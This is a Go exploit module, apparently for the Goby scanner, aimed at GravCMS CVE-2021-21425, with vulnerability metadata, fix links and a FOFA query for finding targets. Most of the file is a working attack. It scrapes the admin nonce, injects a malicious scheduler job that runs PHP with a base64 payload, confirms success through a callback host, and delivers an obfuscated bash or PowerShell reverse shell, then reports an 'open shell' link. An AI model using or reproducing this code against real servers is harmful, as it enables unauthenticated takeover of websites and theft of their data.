package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "GravCMS scheduler Api Unauthenticated Code Execution Vulnerability (CVE-2021-21425)",
    "Description": "<p>Grav is a scalable CMS (Content Management System) for personal blogs, small content publishing platforms, and single-page product displays.</p><p>In versions 1.10.7 and earlier, an unauthenticated user can execute some methods of administrator controller without needing any credentials. Particular method execution will result in arbitrary YAML file creation or content change of existing YAML files on the system. Successfully exploitation of that vulnerability results in configuration changes, such as general site information change, custom scheduler job definition, etc. Due to the nature of the vulnerability, an adversary can change some part of the webpage, or hijack an administrator account, or execute operating system command under the context of the web-server user. This vulnerability is fixed in version 1.10.8. Blocking access to the /admin path from untrusted sources can be applied as a workaround.</p>",
    "Impact": "<p>GravCMS Unauthenticated Code Execution Vulnerability</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://github.com/getgrav/grav-plugin-admin/security/advisories/GHSA-6f53-6qgv-39pj\">https://github.com/getgrav/grav-plugin-admin/security/advisories/GHSA-6f53-6qgv-39pj</a></p>",
    "Product": "GravCMS",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "GravCMS scheduler 接口未认证代码执行漏洞（CVE-2021-21425）",
            "Product": "GravCMS",
            "Description": "<p>Grav是一套可扩展的用于个人博客、小型内容发布平台和单页产品展示的CMS（内容管理系统）。</p><p>在 1.10.7 及更早的版本中，未经身份验证的用户无需任何凭据即可执行管理员控制器的某些方法。 特定的方法执行将导致任意 YAML 文件的创建或系统上现有 YAML 文件的内容更改。 成功利用该漏洞会导致配置更改，例如一般站点信息更改、自定义调度程序作业定义等。由于漏洞的性质，攻击者可以更改网页的某些部分，或劫持管理员帐户，或执行 网络服务器用户上下文下的操作系统命令。 此漏洞已在 1.10.8 版本中修复。 阻止从不受信任的来源访问 /admin 路径可以作为一种解决方法。<br></p>",
            "Recommendation": "<p><a target=\"_Blank\" href=\"https://github.com/getgrav/grav-plugin-admin/security/advisories/GHSA-6f53-6qgv-39pj\"></a></p><p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</p><p><a href=\"https://github.com/getgrav/grav-plugin-admin/security/advisories/GHSA-6f53-6qgv-39pj\">https://github.com/getgrav/grav-plugin-admin/security/advisories/GHSA-6f53-6qgv-39pj</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "GravCMS scheduler Api Unauthenticated Code Execution Vulnerability (CVE-2021-21425)",
            "Product": "GravCMS",
            "Description": "<p><span style=\"font-size: 16.96px;\">Grav is a scalable CMS (Content Management System) for personal blogs, small content publishing platforms, and single-page product displays.</span></p><p><span style=\"font-size: 16.96px;\">In versions 1.10.7 and earlier, an unauthenticated user can execute some methods of administrator controller without needing any credentials. Particular method execution will result in arbitrary YAML file creation or content change of existing YAML files on the system. Successfully exploitation of that vulnerability results in configuration changes, such as general site information change, custom scheduler job definition, etc. Due to the nature of the vulnerability, an adversary can change some part of the webpage, or hijack an administrator account, or execute operating system command under the context of the web-server user. This vulnerability is fixed in version 1.10.8. Blocking access to the /admin path from untrusted sources can be applied as a workaround.</span><br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://github.com/getgrav/grav-plugin-admin/security/advisories/GHSA-6f53-6qgv-39pj\">https://github.com/getgrav/grav-plugin-admin/security/advisories/GHSA-6f53-6qgv-39pj</a></p>",
            "Impact": "<p>GravCMS Unauthenticated Code Execution Vulnerability</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "body=\"content=\\\"GravCMS\\\"\"",
    "GobyQuery": "body=\"content=\\\"GravCMS\\\"\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "https://getgrav.org/",
    "DisclosureDate": "2022-04-03",
    "References": [
        "https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-21425"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202104-406"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "createSelect",
            "value": "goby_shell_linux,goby_shell_win",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10363"
}`

	ofbBashBase64CMD := func(cmd string) string {
		cmdBase64 := base64.StdEncoding.EncodeToString([]byte(cmd))
		cmdstr := fmt.Sprintf(`bash -c '{echo,%s}|{base64,-d}|{bash,-i}'`, cmdBase64)
		cmdstr = base64.StdEncoding.EncodeToString([]byte(cmdstr))
		return cmdstr
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(6)
			adminUri := "/admin"
			yamlUri := "/user/config/scheduler.yaml"
			uri := "/admin/config/scheduler"
			command := "/usr/bin/php"
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			jobName := goutils.RandomHexString(5)
			dnsUrl := "http://" + checkUrl
			dnsUrl = base64.StdEncoding.EncodeToString([]byte(dnsUrl))
			payLoad := fmt.Sprintf("-r file_get_contents(base64_decode(\"%s\"));", dnsUrl)
			cfg := httpclient.NewGetRequestConfig(adminUri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `action="/`) {
					regRule := regexp.MustCompile(`"admin-nonce" value="(\w+)"`)
					adminNonce := regRule.FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
					if resp1, err := httpclient.SimpleGet(u.FixedHostInfo + yamlUri); err == nil {
						if resp1.StatusCode == 403 {
							postData := fmt.Sprintf("admin-nonce=%s&task=SaveDefault&data[custom_jobs][%s][command]=%s&data[custom_jobs][%s][args]=%s&data[custom_jobs][%s][at]=* * * * *&data[custom_jobs][%s][output]=&data[status][%s]=enabled&data[custom_jobs][%s][output_mode]=overwrite", adminNonce, jobName, command, jobName, payLoad, jobName, jobName, jobName, jobName)
							cfg := httpclient.NewPostRequestConfig(uri)
							cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
							cfg.Header.Store("Cookie", resp.Cookie)
							cfg.VerifyTls = false
							cfg.FollowRedirect = false
							cfg.Data = postData
							if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
								if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Successfully saved") {
									time.Sleep(time.Duration(60) * time.Second)
									flag := godclient.PullExists(checkStr, time.Second*3)
									if flag {
										postData = fmt.Sprintf("admin-nonce=%s&task=SaveDefault&data[custom_jobs][%s][command]=echo&data[custom_jobs][%s][args]=1&data[custom_jobs][%s][at]=0 1 1 * *&data[custom_jobs][%s][output]=&data[status][%s]=enabled&data[custom_jobs][%s][output_mode]=overwrite", adminNonce, jobName, jobName, jobName, jobName, jobName, jobName)
										cfg := httpclient.NewPostRequestConfig(uri)
										cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
										cfg.Header.Store("Cookie", resp.Cookie)
										cfg.VerifyTls = false
										cfg.FollowRedirect = false
										cfg.Data = postData
										if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
											if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Successfully saved") {
											}
										}
										return true
									}
								}
							}
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			adminUri := "/admin"
			uri := "/admin/config/scheduler"
			command := "/usr/bin/php"
			jobName := goutils.RandomHexString(5)
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByBash(rp)
					payLoad := fmt.Sprintf("-r exec(base64_decode(\"%s\"));", ofbBashBase64CMD(cmd))
					if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + adminUri); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `action="/`) {
							regRule := regexp.MustCompile(`"admin-nonce" value="(\w+)"`)
							adminNonce := regRule.FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
							postData := fmt.Sprintf("admin-nonce=%s&task=SaveDefault&data[custom_jobs][%s][command]=%s&data[custom_jobs][%s][args]=%s&data[custom_jobs][%s][at]=* * * * *&data[custom_jobs][%s][output]=&data[status][%s]=enabled&data[custom_jobs][%s][output_mode]=overwrite", adminNonce, jobName, command, jobName, payLoad, jobName, jobName, jobName, jobName)
							cfg := httpclient.NewPostRequestConfig(uri)
							cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
							cfg.Header.Store("Cookie", resp.Cookie)
							cfg.VerifyTls = false
							cfg.FollowRedirect = false
							cfg.Data = postData
							httpclient.DoHttpRequest(expResult.HostInfo, cfg)
							time.Sleep(time.Duration(60) * time.Second)
							select {
							case webConsleID := <-waitSessionCh:
								if u, err := url.Parse(webConsleID); err == nil {
									postData = fmt.Sprintf("admin-nonce=%s&task=SaveDefault&data[custom_jobs][%s][command]=echo&data[custom_jobs][%s][args]=1&data[custom_jobs][%s][at]=0 1 1 * *&data[custom_jobs][%s][output]=&data[status][%s]=enabled&data[custom_jobs][%s][output_mode]=overwrite", adminNonce, jobName, jobName, jobName, jobName, jobName, jobName)
									cfg := httpclient.NewPostRequestConfig(uri)
									cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
									cfg.Header.Store("Cookie", resp.Cookie)
									cfg.VerifyTls = false
									cfg.FollowRedirect = false
									cfg.Data = postData
									if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
										if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Successfully saved") {
										}
									}
									expResult.Success = true
									expResult.OutputType = "html"
									sid := strings.Join(u.Query()["id"], "")
									expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
								}
							case <-time.After(time.Second * 3):
							}
						}
					}
				}
			}
			if ss.Params["AttackType"].(string) == "goby_shell_win" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByPowershell(rp)
					payLoad := fmt.Sprintf("-r exec(base64_decode(\"%s\"));", ofbBashBase64CMD(cmd))
					if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + adminUri); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `action="/`) {
							regRule := regexp.MustCompile(`"admin-nonce" value="(\w+)"`)
							adminNonce := regRule.FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
							postData := fmt.Sprintf("admin-nonce=%s&task=SaveDefault&data[custom_jobs][%s][command]=%s&data[custom_jobs][%s][args]=%s&data[custom_jobs][%s][at]=* * * * *&data[custom_jobs][%s][output]=&data[status][%s]=enabled&data[custom_jobs][%s][output_mode]=overwrite", adminNonce, jobName, command, jobName, payLoad, jobName, jobName, jobName, jobName)
							cfg := httpclient.NewPostRequestConfig(uri)
							cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
							cfg.Header.Store("Cookie", resp.Cookie)
							cfg.VerifyTls = false
							cfg.FollowRedirect = false
							cfg.Data = postData
							httpclient.DoHttpRequest(expResult.HostInfo, cfg)
							time.Sleep(time.Duration(60) * time.Second)
							select {
							case webConsleID := <-waitSessionCh:
								if u, err := url.Parse(webConsleID); err == nil {
									postData = fmt.Sprintf("admin-nonce=%s&task=SaveDefault&data[custom_jobs][%s][command]=echo&data[custom_jobs][%s][args]=1&data[custom_jobs][%s][at]=0 1 1 * *&data[custom_jobs][%s][output]=&data[status][%s]=enabled&data[custom_jobs][%s][output_mode]=overwrite", adminNonce, jobName, jobName, jobName, jobName, jobName, jobName)
									cfg := httpclient.NewPostRequestConfig(uri)
									cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
									cfg.Header.Store("Cookie", resp.Cookie)
									cfg.VerifyTls = false
									cfg.FollowRedirect = false
									cfg.Data = postData
									if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
										if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Successfully saved") {
										}
									}
									expResult.Success = true
									expResult.OutputType = "html"
									sid := strings.Join(u.Query()["id"], "")
									expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
								}
							case <-time.After(time.Second * 3):
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
